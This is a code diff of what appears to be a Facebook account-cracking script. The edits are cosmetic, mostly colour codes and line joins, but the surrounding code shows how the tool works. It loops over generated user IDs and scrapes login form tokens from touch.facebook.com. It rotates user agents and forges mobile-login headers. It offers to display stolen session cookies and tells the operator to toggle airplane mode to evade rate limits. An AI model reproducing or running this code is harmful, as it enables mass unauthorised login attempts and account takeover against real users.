@@ -655,7 +655,7 @@ def SUMON2():
     linex()
     SUMONfire = input("[+] [CHOOSE] :- ")
     linex()
-    print(" [?] Do You Want To Show Cookies : (Y/N) ")
+    print("\033[1;32m[?] Do You Want To Show Cookies : (Y/N) ")
     linex()
     c = input(" [?] INPUT : ")
     if c in ["Y", "y"]:
@@ -667,7 +667,7 @@ def SUMON2():
         SUMON_time()
         tl = str(len(user))
         print(f"\033[1;32m[✓] YOUR LIMIT UID  : "+tl+" ")
-        linex();print('\033[1;32m MODE ON/OFF (\033[1;32mAIRPLANE\033[1;32m)  ');linex()
+        linex();print('\033[1;32m             MODE ON/OFF (\033[1;32mAIRPLANE\033[1;32m)  ');linex()
         for guru in user:
             uid = kode+guru
             mk = uid[:6]
@@ -1366,8 +1366,7 @@ def p(uid,pwx,tl):
             ua = random.choice(uas)
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            data = {'m_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
 'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
 'try_number': '0',
 'unrecognized_tries': '0',
@@ -1390,8 +1389,7 @@ def p(uid,pwx,tl):
 'a': '',
 '__user': '0',
 '_fb_noscript': 'true'}
-            headers ={
-'Host': 'm.facebook.com',
+            headers ={'Host': 'm.facebook.com',
 'content-length': '510',
 'sec-ch-ua': '"Not.A/Brand";v="20", "Chromium";v="112", "Google Chrome";v="110"',
 'sec-ch-ua-mobile': '?1',
